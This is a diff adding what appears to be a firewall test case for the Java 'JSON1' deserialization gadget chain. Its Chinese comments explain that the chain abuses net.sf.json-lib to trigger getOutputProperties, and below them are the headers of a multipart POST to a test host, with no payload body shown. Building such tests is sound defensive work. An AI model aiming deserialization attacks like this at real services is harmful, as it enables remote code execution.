@@ -1,0 +1,10 @@
+# 反序列化-JAVA JSON1
+# 利用 JSON 序列化库触发所有 getter 方法并不鲜见。 JSON1 链就利用了 net.sf.json-lib 这个 JSON 序列化库来触发 getOutputProperties 方法。
+POST /?acid=80001754&bid=hd_tag_m8mv25nn HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25nn
+RM-PRO-Token: 1085a22aed12279b8331e31777ecbc38
+RM-PRO-Time: 1742808486030
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=pn1-J9ksp0f_F4p1HTDhsAbKcwFdfmY8
+
